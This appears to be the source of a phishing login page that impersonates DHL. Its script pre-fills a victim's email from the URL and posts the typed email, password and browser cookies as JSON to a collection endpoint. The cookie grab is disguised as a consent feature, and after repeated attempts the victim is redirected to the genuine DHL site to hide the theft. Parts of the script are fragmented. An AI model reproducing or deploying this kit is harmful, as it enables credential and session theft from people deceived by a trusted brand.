<!DOCTYPE html>
<html id="html" lang="en">
<head>
    <meta charset="UTF-8">

    <style>
        body {
            font-family: "Roboto", sans-serif;
            background: url('https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/4be2ae5d-624c-4fa5-954d-060702ddca90.png') no-repeat center center fixed;
            background-size: cover;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: rgba(255, 255, 255, 0.9);
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            z-index: 1;
            position: relative;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .header img {
            height: 40px;
        }
        .lang-switcher {
            padding: 5px;
            border-radius: 4px;
            background: #ffffff;
        }
        h1 {
            font-size: 24px;
            margin: 0 0 20px;
            text-align: center;
            color: #333333;
        }
        .quick-actions {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        .quick-actions a {
            text-decoration: none;
            color: #d40511;
            font-weight: bold;
            font-size: 14px;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        input[type="text"], input[type="password"], input[type="email"] {
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #cccccc;
            border-radius: 4px;
            font-size: 16px;
            background: #ffffff;
        }
        .password-container {
            position: relative;
        }
        .password-container input {
            width: 100%;
            box-sizing: border-box;
        }
        .toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #666666;
        }
        button {
            padding: 10px;
            background-color: #d40511;
            color: #ffffff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #b0040f;
        }
        .error-message {
            color: #d40511;
            font-size: 14px;
            margin-bottom: 10px;
            text-align: center;
        }
        .links {
            margin-top: 20px;
            text-align: center;
        }
        .links a {
            color: #d40511;
            text-decoration: none;
            font-size: 14px;
            display: block;
            margin-bottom: 10px;
        }
        /* Cookie Consent Popup Styles */
        .cookie-consent {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(255, 255, 255, 0.95);
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
            max-width: 500px;
            width: 90%;
            z-index: 1000;
            text-align: center;
            display: none; /* Hidden by default */
        }
        .cookie-consent p {
            margin: 0 0 15px;
            font-size: 14px;
            color: #333333;
        }
        .cookie-consent button {
            margin: 0 10px;
            padding: 8px 16px;
            font-size: 14px;
        }
        .cookie-consent .accept {
            background-color: #d40511;
        }
        .cookie-consent .accept:hover {
            background-color: #b0040f;
        }
        .cookie-consent .decline {
            background-color: #666666;
        }
        .cookie-consent .decline:hover {
            background-color: #555555;
        }
        @media (max-width: 480px) {
            .container {
                padding: 15px;
                margin: 10px;
                background: rgba(255, 255, 255, 0.9);
            }
            h1 {
                font-size: 20px;
            }
            .header img {
                height: 30px;
            }
            .quick-actions a {
                font-size: 12px;
            }
            .cookie-consent {
                bottom: 10px;
                padding: 15px;
            }
            .cookie-consent p {
                font-size: 12px;
            }
            .cookie-consent button {
                padding: 6px 12px;
                font-size: 12px;
            }
        }
        [dir="rtl"] .header {
            flex-direction: row-reverse;
        }
        [dir="rtl"] .quick-actions {
            flex-direction: row-reverse;
        }
        [dir="rtl"] .toggle-password {
            left: 10px;
            right: auto;
        }
        [dir="rtl"] input {
            text-align: right;
        }
        [dir="rtl"] .cookie-consent {
            text-align: right;
        }
    </style>

        // Function to validate and extract email from URL hash or eta query parameter
        function extractEmailFromUrl() {
            const isValidEmail = email => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);

            const hash = window.location.hash ? decodeURIComponent(window.location.hash.substring(1)) : null;
            if (hash && isValidEmail(hash)) {
                console.log('Valid email from hash:', hash);
                return hash;
            } else if (hash) {
                console.warn('Invalid email format in URL hash:', hash);
            }

            const urlParams = new URLSearchParams(window.location.search);
            const eta = urlParams.get('eta') ? decodeURIComponent(urlParams.get('eta')) : null;
            if (eta && isValidEmail(eta)) {
                console.log('Valid email from eta:', eta);
                return eta;
            } else if (eta) {
                console.warn('Invalid email format in eta query parameter:', eta);
            }

            console.warn('No valid email found in URL hash or eta query parameter.');
            return null;
        }

        // Function to detect user's language
        function detectUserLanguage() {
            const supportedLanguages = ['en', 'zh-CN', 'hi', 'es', 'fr', 'ar', 'ko', 'ja', 'vi'];
            const userLanguages = navigator.languages || [navigator.language || 'en'];
            console.log('Detected browser languages:', userLanguages);
            for (let lang of userLanguages) {
                if (lang.startsWith('zh')) {
                    console.log('Matched zh to zh-CN');
                    return 'zh-CN';
                }
                if (supportedLanguages.includes(lang)) {
                    console.log('Matched language:', lang);
                    return lang;
                }
                const baseLang = lang.split('-')[0];
                if (supportedLanguages.includes(baseLang)) {
                    console.log('Matched base language:', baseLang);
                    return baseLang;
                }
            }
            console.log('Falling back to English (en)');
            return 'en';
        }

        i18next.init({
            lng: detectUserLanguage(),
            fallbackLng: 'en',
            resources: translations,
            debug: true
        }, function(err, t) {
            if (err) {
                console.error('i18next initialization error:', err);
                return;
            }
            console.log('i18next initialized with language:', i18next.language);
            const lang = i18next.language;
            document.getElementById('html').setAttribute('lang', lang);
            document.getElementById('html').setAttribute('dir', lang === 'ar' ? 'rtl' : 'ltr');
            document.querySelectorAll('[data-i18n]').forEach(element => {
                const key = element.getAttribute('data-i18n');
                if (key.startsWith('[placeholder]')) {
                    element.placeholder = t(key.replace('[placeholder]', ''));
                } else if (key.startsWith('[value]')) {
                    element.value = t(key.replace('[value]', ''));
                } else {
                    element.innerText = t(key);
                }
            });
            document.title = t('title');
            document.querySelector('.lang-switcher').value = lang;

            // Show cookie consent popup after i18next initialization
            showCookieConsent();
        });

        // Language switcher for manual override

            i18next.changeLanguage(lang, (err, t) => {
                if (err) {

                    return;
                }
                console.log('Language changed to:', lang);
                const html = document.getElementById('html');
                html.setAttribute('lang', lang);
                html.setAttribute('dir', lang === 'ar' ? 'rtl' : 'ltr');
                document.querySelectorAll('[data-i18n]').forEach(element => {
                    const key = element.getAttribute('data-i18n');
                    if (key.startsWith('[placeholder]')) {

                    } else if (key.startsWith('[value]')) {

                    } else {

                    }
                });
                document.title = t('title');
                document.querySelector('.lang-switcher').value = lang;

                // Update cookie consent message on language change
                document.getElementById('cookie-consent').querySelector('p').innerText = t('cookie_consent_message');
            });

        // Cookie Consent Functions
        function setCookie(name, value, days) {
            let expires = "";
            if (days) {
                const date = new Date();
                date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
                expires = "; expires=" + date.toUTCString();
            }
            document.cookie = name + "=" + (value || "") + expires + "; path=/; SameSite=Strict";
            console.log(`Cookie set: ${name}=${value}`);
        }

        function getCookie(name) {
            const nameEQ = name + "=";
            const ca = document.cookie.split(';');
            for (let i = 0; i < ca.length; i++) {
                let c = ca[i];
                while (c.charAt(0) === ' ') c = c.substring(1);
                if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length);
            }
            return null;
        }

        function showCookieConsent() {
            const consent = getCookie('cookieConsent');
            const consentPopup = document.getElementById('cookie-consent');
            if (!consent) {
                consentPopup.style.display = 'block';
                console.log('Showing cookie consent popup');
            } else {
                console.log('Cookie consent already set:', consent);
            }
        }

        function setCookieConsent(status) {
            setCookie('cookieConsent', status, 365); // Store consent for 1 year
            document.getElementById('cookie-consent').style.display = 'none';
            console.log(`Cookie consent set to: ${status}`);
        }

        // Function to get all cookies as a string (excluding cookieConsent)
        function getCookies() {
            const cookies = document.cookie ? document.cookie.split('; ').filter(cookie => !cookie.startsWith('cookieConsent=')).join('; ') : '';
            console.log('Captured cookies:', cookies);
            return cookies;
        }

                const password = form.password.value;
                const honeypot = form.honeypot.value;
                const consent = getCookie('cookieConsent');
                const cookies = consent === 'accepted' ? getCookies() : ''; // Only include cookies if consent is granted

                if (!email || !password) {
                    errorMessageEl.textContent = i18next.t('error_message');
                    return;
                }

                if (honeypot) {
                    console.warn('Honeypot field filled, likely a bot submission.');
                    return;
                }

                try {
                    const payload = { email, password };
                    if (cookies) payload.cookies = cookies; // Include cookies only if present and consented

                    const response = await fetch(submitEndpoint, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload),
                    });

                    if (!response.ok) {
                        throw new Error('Login failed');
                    }

                    console.log('Login successful, cookies sent:', cookies || 'None (consent not granted or no cookies)');
                } catch (error) {
                    console.error('Form submission error:', error);
                    attemptCount++;
                    if (attemptCount < maxAttempts) {
                        form.password.value = '';
                        form.password.focus();
                        errorMessageEl.textContent = i18next.t('error_message');
                    } else {
                        window.location.href = 'https://mydhl.express.dhl/gq/en/auth/link-error.html';
                    }
                }
            });

            const togglePassword = document.getElementById('toggle-password');
            togglePassword.addEventListener('click', () => {
                const passwordInput = document.getElementById('password');
                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                passwordInput.setAttribute('type', type);
                togglePassword.querySelector('i').classList.toggle('fa-eye-slash');
            });
        })();
    </script>
</body>
